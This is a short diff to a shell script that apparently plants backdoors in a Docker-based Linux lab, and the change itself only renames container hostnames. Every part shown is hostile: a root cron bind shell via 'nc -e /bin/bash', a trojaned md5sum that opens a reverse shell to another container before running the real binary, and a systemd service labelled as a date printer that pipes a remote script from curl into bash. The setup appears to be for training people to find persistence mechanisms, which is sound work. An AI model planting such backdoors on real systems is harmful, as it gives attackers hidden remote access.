@@ -12,7 +12,7 @@ echo "*/1 * * * * root /usr/bin/nc -e /bin/bash -l 666 &" >> /etc/crontab
 # create a reverse shell in the md5sum command (4)
 cat > /usr/local/bin/md5sum <<- EOM
 #!/bin/bash
-(nc -e /bin/bash linux-lab-docker_web0_1.linux-lab-docker_web 4444 ) &>/dev/null &
+(nc -e /bin/bash linux-lab-docker-web0-1 4444 ) &>/dev/null &
 /usr/bin/md5sum \$1
 EOM
 chmod +x /usr/local/bin/md5sum
@@ -24,7 +24,7 @@ Description=Prints date into /tmp/date file
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c "/usr/bin/curl linux-lab-docker_web0_1.linux-lab-docker_web:8080/run.sh | /bin/bash"
+ExecStart=/bin/bash -c "/usr/bin/curl linux-lab-docker-web0-1:8080/run.sh | /bin/bash"
 EOM
 
 cat > /etc/systemd/system/cleanup.timer <<- EOM
